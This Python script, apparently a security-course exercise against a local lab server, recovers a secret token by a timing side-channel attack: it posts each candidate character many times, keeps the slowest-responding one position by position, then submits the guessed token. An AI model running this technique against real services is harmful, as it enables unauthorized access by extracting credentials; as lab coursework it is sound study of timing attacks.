import requests
import time

url = 'http://0.0.0.0:8080/hw6/ex1'
charset = 'abcdefghijklmnopqrstuvz0123456789'
LENGTH = 12
iterations = 50

def print_percent_done(index, total, bar_len=50, title='Loading'):
    '''
    index is expected to be 0 based index. 
    0 <= index < total
    '''
    percent_done = (index+1)/total*100
    percent_done = round(percent_done, 1)

    done = round(percent_done/(100/bar_len))
    togo = bar_len-done

    done_str = '█'*int(done)
    togo_str = '░'*int(togo)

    print(f'⏳  {title}: [{done_str}{togo_str}] {percent_done}% done', end='\r')

    if round(percent_done) == 100:
        print('\t✅')
    
def post(token):
    start = time.time()
    requests.post(url, json={"token": token})
    return time.time() - start

def validate(token):
    response = requests.post(url, json={"token": token})
    print(f'Token: {token} -> Status: ' + str(response.status_code))

def main():

    token = ['*'] * LENGTH
    print_percent_done(-1, LENGTH)
    for pos in range(LENGTH):
        curr_max = 0
        best_char = '*'
        for char in charset:
            token[pos] = char
            tot = 0
            for _ in range(iterations):
                tot += post(''.join(token))
            delay = tot / iterations

            if delay > curr_max:
                curr_max = delay
                best_char = char

        token[pos] = best_char
        print_percent_done(pos, LENGTH)

    validate(''.join(token))

if __name__ == '__main__':
    main()